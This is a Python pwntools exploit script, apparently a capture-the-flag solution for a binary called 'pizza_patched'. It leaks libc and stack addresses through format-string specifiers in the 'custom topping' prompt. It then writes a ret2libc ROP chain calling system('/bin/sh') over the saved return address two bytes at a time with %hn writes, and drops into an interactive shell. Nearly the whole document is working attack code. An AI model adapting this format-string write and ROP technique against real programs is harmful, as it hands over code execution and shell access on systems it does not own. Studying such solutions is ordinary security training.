#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        #r = gdb.debug([exe.path])
        r = process([exe.path])
        #if args.GDB:
            #gdb.attach(r)
    else:
        r = remote("localhost", 5000)

    return r

def inject_payload(payload, r, arg_offset, buffer_size, write_addr):

    payload_len = len(payload)
    inject_shorts = []

    # Insert using format string exploit using a granularity of 2 bytes (i.e. short)
    for i in range(payload_len//2):
        inject_short = payload[2*i+1]*0x100 + payload[2*i]
        inject_shorts.append((inject_short, i))
    
    inject_shorts.sort()

    # Insert 4 shorts at a time
    inject_shorts_len = len(inject_shorts)
    for i in range(inject_shorts_len//4):

        # Initialize variables / Start condition
        base_index = 4*i
        base_write_param_num = buffer_size//8 + arg_offset - 4
        
        inject_bstr = b''
        if inject_shorts[base_index][0] != 0:
            inject_bstr += b'%'+str(inject_shorts[base_index][0]).encode()+b'c'
        inject_bstr += b'%'+str(base_write_param_num).encode() + b'$hn'

        for j in range(1,4): 
            diff = inject_shorts[base_index+j][0]-inject_shorts[base_index+j-1][0]
            if diff != 0: 
                inject_bstr += b'%'+str(diff).encode()+b'c'

            inject_bstr += b'%'+str(base_write_param_num+j).encode() + b'$hn'

        inject_bstr = inject_bstr.ljust((buffer_size//8-4)*8)
        
        for j in range(0,4):
            inject_bstr += p64(write_addr + 2*inject_shorts[base_index+j][1])

        print(f"Payload {i}: {inject_bstr}")

        # Inject Payload  
        r.sendlineafter(b'> ', b'12')
        r.sendlineafter(b'Enter custom topping: ', inject_bstr)

        # Reset program loop
        for j in range(2):
            r.sendlineafter(b'> ', b'12')
            r.sendlineafter(b'Enter custom topping: ', b'A')
        if i != inject_shorts_len//4 - 1:
            r.sendlineafter(b'(y/n): ', b'y')

    # Cease program execution so that it returns and hits our ROP chain
    r.sendlineafter(b'(y/n): ', b'n')

    return


def main():
    r = conn()
    
    # Injecting Payload to leak libc base address
    r.sendlineafter(b'> ', b'12')
    r.sendlineafter(b'Enter custom topping: ', b'%47$p|||aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaa')

    # Injecting Payload to leak address on stack to write to
    # Injected twice because input is read thrice in one program loop
    for i in range(2):
        r.sendlineafter(b'> ', b'12')
        r.sendlineafter(b'Enter custom topping: ', b'%48$p|||aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaa')
            
    # Reading leak to calculate libc base address
    # __libc_start_main-0x36 is where main returns to
    r.recvuntil(b'that you chose:\n')
    libc_start_main_addr = bytes.fromhex(r.recvline().strip().split(b'|')[0].decode()[2:])[::-1].ljust(8,b'\x00')
    libc_base_addr = u64(libc_start_main_addr) + 0x36 - libc.symbols.__libc_start_main
    libc.address = libc_base_addr
    
    # Reading leak of stack address which retaddr resides
    # Read twice, coresponds to the number of inputs relating to payload injection for this leak
    for i in range(2):
        write_addr = bytes.fromhex(r.recvline().strip().split(b'|')[0].decode()[2:])[::-1].ljust(8,b'\x00')
        write_addr = u64(write_addr) - 0xf8

    log.info(f"{hex(libc.address)=}")
    log.info(f"{hex(write_addr)=}")

    # Constructing ROP chain
    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = libc.address + 0x277e5 # Taken from xgadget
    binsh = next(libc.search(b"/bin/sh\x00"))

    # Create payload
    rop.raw(ret)
    rop.raw(pop_rdi)
    rop.raw(binsh)
    rop.raw(libc.symbols.system)
    log.info(rop.dump())

    # Reset and inject payload
    r.sendlineafter(b'(y/n): ', b'y')
    inject_payload(rop.chain(), r, 6, 99, write_addr)

    r.interactive()


if __name__ == "__main__":
    main()